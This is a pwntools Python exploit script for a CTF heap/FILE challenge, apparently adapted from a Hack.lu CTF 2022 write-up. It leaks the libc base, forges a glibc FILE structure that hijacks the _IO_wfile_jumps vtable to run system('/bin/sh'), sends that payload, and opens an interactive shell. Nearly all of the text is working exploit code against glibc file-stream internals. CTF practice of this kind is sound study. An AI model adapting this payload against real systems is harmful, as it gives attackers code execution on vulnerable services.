from pwn import *
from pwncli import IO_FILE_plus_struct

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = e.libc

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('127.0.0.1', 31337)
    else:
        return process(e.path)


def leak_libc():
    p.recvuntil(b'Here is your foundation: ')
    stdout = int(p.recvline().strip(b'\n'), 16)
    libc.address = stdout-libc.sym['_IO_2_1_stdout_']
    log.info("Libc Base: 0x%x" % libc.address)


p = start()

leak_libc()


'''
Solution based on Based on https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor
'''

fp = FileStructure()
fp._IO_read_end = libc.sym['system']
fp._IO_save_base = libc.address + 0x14034c
fp._IO_write_end = u64(b'/bin/sh\x00')
fp._lock = libc.symbols['_IO_2_1_stdout_']-0x10
fp._codecvt = libc.sym['_IO_2_1_stdout_']+0xb8
fp.unknown2 = b'\x00'*8
fp.vtable = 0x0
payload = bytes(fp)
payload += p64(libc.sym['_IO_2_1_stdout_']+0x20)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(libc.sym['_IO_wfile_jumps']-0x18)

p.send(payload)

p.interactive()
